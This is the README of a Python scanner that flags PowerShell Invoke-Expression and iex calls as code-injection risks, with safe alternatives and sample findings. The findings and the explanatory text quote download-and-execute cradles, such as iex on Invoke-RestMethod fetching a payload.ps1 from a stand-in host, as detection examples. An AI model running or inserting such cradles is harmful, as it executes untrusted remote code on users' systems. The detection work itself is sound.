# llm-output-powershell-invoke-expression-detector

Pure-stdlib python3 single-pass scanner that flags `Invoke-Expression`
(and its `iex` alias) calls in PowerShell source files.

## What it detects

`Invoke-Expression STRING` in PowerShell takes its string argument and
re-parses it as PowerShell script in the current scope. Any variable,
subexpression, pipeline output, or user-controlled fragment that flows
into `Invoke-Expression` is a code-injection sink with the same blast
radius as `system($USER_INPUT)`.

The alias `iex` is a near-universal LLM tell — `iex (irm http://...)`
is the canonical drive-by-download pattern.

LLM-emitted PowerShell reaches for `Invoke-Expression` to "run a
command stored in a variable" — almost always wrong. The safe forms
are:

* `& $cmd $arg1 $arg2 ...`        — call operator with arg list
* `& { ...literal scriptblock... }` — scriptblock invocation
* `Start-Process -FilePath ... -ArgumentList ...`
* never `Invoke-Expression $cmd` / `iex $cmd`

The detector flags `Invoke-Expression` and `iex` at command position
regardless of whether the argument is quoted, interpolated, a pipeline
result, or a literal — the cmdlet itself is the smell. Suppress an
audited line with a trailing `# iex-ok` comment.

## What gets scanned

* Files with extension `.ps1`, `.psm1`, `.psd1`.
* Directories are recursed.

## False-positive notes

* `Invoke-Expression` / `iex` inside a `#` line comment or inside a
  `'...'` / `"..."` literal is masked out before scanning, so it is
  never flagged unless it is the command-position token itself.
* PowerShell backtick escapes (` `` ` `) and doubled-quote escapes
  (`""`, `''`) inside strings are handled.
* A function or variable named `Invoke-ExpressionLogger`, `iex_helper`,
  `$iex_log`, etc. is NOT flagged — the regex requires word-boundary
  `\b` on both sides plus following whitespace and an argument.
* `Invoke-Command`, `Invoke-WebRequest`, `Invoke-RestMethod` are
  different cmdlets and are NOT flagged.
* `# iex-ok` on a line suppresses that line entirely.
* PowerShell `<# ... #>` block comments and `@" ... "@` here-strings
  span multiple lines and are NOT separately tracked. False-positives
  inside those bodies are treated as findings worth a human glance —
  the conservative posture for a security-focused detector.
* The detector does not try to prove a string is constant — literal
  `Invoke-Expression 'Get-Date'` is still flagged. Add `# iex-ok` if
  it's intentional.

## Usage

```
python3 detect.py <file_or_dir> [<file_or_dir> ...]
```

Exits 1 if any findings, 0 otherwise. Output format:

```
<path>:<line>:<col>: invoke-expression — <stripped source line>
<path>:<line>:<col>: iex-alias         — <stripped source line>
# <N> finding(s)
```

## Smoke test (verified)

```
$ python3 detect.py examples/bad.ps1
examples/bad.ps1:4:1: invoke-expression — Invoke-Expression $cmd                          # 1: variable into Invoke-Expression
examples/bad.ps1:7:1: iex-alias — iex $action                                      # 2: alias `iex` with variable
examples/bad.ps1:10:1: iex-alias — iex (Invoke-RestMethod "https://example.test/payload.ps1")  # 3: pipeline result into iex
examples/bad.ps1:13:5: invoke-expression — Invoke-Expression "Deploy-$target -Force"   # 4: interpolated string into iex
examples/bad.ps1:18:1: invoke-expression — Invoke-Expression 'Get-Date'                     # 5: literal-string Invoke-Expression
examples/bad.ps1:21:13: iex-alias — if ($cmd) { iex $cmd }                           # 6: inside scriptblock
examples/bad.ps1:22:11: iex-alias — $result = iex $cmd                               # 7: after `=` (assignment)
examples/bad.ps1:23:25: iex-alias — $cmd | ForEach-Object { iex $_ }                 # 8: inside ForEach-Object scriptblock
examples/bad.ps1:26:1: invoke-expression — Invoke-Expression -Command $cmd                  # 9: -Command param
examples/bad.ps1:29:9: iex-alias — $x = 1; iex $cmd                                 # 10: after `;`
# 10 finding(s)

$ python3 detect.py examples/good.ps1
# 0 finding(s)
```

bad: **10** findings, good: **0** findings.
